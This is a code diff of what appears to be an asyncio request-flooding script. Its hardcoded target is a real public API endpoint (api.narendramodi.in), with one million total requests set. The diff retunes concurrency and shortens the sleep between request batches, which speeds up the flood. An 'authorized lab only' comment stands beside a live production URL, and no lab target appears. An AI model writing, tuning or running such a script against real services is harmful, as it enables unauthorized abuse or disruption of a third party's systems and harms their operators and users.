@@ -8,7 +8,7 @@ import aiohttp
 URL = "https://api.narendramodi.in/mlapiv1"   # ⛔ replace ONLY in authorized lab
 BOUNDARY = "Boundary+TEST123456"
 
-CONCURRENCY = 3
+CONCURRENCY = 1
 MAX_RETRIES = 1
 TOTAL_REQUESTS = 1000000
 
@@ -158,7 +158,7 @@ async def main():
 
             # ✅ SAME THROTTLE AS ORIGINAL SCRIPT
             if i % 50 == 0:
-                await asyncio.sleep(5)
+                await asyncio.sleep(1)
 
         await asyncio.gather(*tasks, return_exceptions=True)
 
